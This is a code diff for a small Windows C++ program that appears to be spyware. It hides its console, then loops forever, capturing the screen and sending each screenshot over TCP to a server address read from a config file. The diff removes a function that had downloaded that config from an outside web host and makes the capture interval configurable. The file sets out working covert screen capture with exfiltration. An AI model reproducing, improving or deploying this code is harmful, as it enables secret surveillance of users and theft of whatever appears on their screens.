@@ -1,4 +1,4 @@
-#pragma comment(lib, "urlmon.lib")
+
 #include <Windows.h>
 #include <string>
 #include <vector>
@@ -18,7 +18,6 @@
 #pragma comment (lib,"Gdiplus.lib")
 
 using namespace Gdiplus;
-using namespace sf;
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 {
@@ -69,16 +68,6 @@ void ScreenShot(const std::wstring& name, std::wstring directory)
 
 }
 
-void DownloadIni()
-{
-	_mkdir("C:\\ProgramData\\Screenshot");
-	HRESULT hr = URLDownloadToFile(NULL, _T("http://domatur.com/Config/config.ini"), _T("C:\\ProgramData\\Screenshot\\config.ini"), 0, NULL);
-}
-
-void Download()
-{
-	DownloadIni();
-}
 
 int main()
 {
@@ -88,29 +77,27 @@ int main()
 
 	FreeConsole();
 	std::wstring name = L"Image.png";
-	if (!_mkdir("C:\\ProgramData\\Screenshot"))
-	{
-		Download();
-	}
-	IniParser inip("C:\\ProgramData\\Screenshot\\config.ini");
+
+	IniParser inip(L"config.ini");
 	std::wstring serverip = inip.GetValue(L"serverip");
 	std::wstring winterval = inip.GetValue(L"interval");
-	std::string interval(winterval.begin(), winterval.end());
+  int interval = _wtoi(winterval.c_str());
 	std::wstring imgsavedir = inip.GetValue(L"imgsavedir");
 	while (true)
 	{
 		ScreenShot(name, imgsavedir);
-		TcpSocket socket;
-		if (socket.connect(IpAddress(string(serverip.begin(), serverip.end())), 2000) == Socket::Status::Done)
+		sf::TcpSocket socket;
+		if (socket.connect(sf::IpAddress(std::string(serverip.begin(), serverip.end())), 2000) == sf::Socket::Status::Done)
 		{
-			Packet packet;
+      sf::Packet packet;
 			std::ifstream inputStream(name, std::ios::binary);
 			std::string str((std::istreambuf_iterator<char>(inputStream)),
 				std::istreambuf_iterator<char>());
 			packet.append(&str[0], str.size());
 			socket.send(packet);
 		}
-		Sleep(1000 * 2);
+
+		Sleep(interval * 1000);
 	}
 
 	GdiplusShutdown(gdiplusToken);
